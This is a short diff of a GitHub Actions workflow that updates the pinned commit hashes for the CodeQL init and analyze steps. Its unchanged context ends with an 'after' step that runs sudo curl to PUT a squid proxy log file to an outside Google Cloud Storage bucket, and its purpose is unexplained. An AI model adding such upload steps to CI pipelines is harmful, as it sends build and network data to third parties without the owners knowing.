@@ -278,7 +278,7 @@ jobs:
     - continue-on-error: true
       if: ${{ env.BUILD_TARGETS != '' }}
       name: Initialize CodeQL
-      uses: github/codeql-action/init@294a9d92911152fe08befb9ec03e240add280cb3
+      uses: github/codeql-action/init@f779452ac5af1c261dce0346a8f964149f49322b
       with:
         languages: cpp
     - continue-on-error: true
@@ -309,7 +309,7 @@ jobs:
     - continue-on-error: true
       if: ${{ env.BUILD_TARGETS != '' }}
       name: Perform CodeQL Analysis
-      uses: github/codeql-action/analyze@294a9d92911152fe08befb9ec03e240add280cb3
+      uses: github/codeql-action/analyze@f779452ac5af1c261dce0346a8f964149f49322b
     - name: after
       run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/freshworks/envoy.$(date
         +%s)
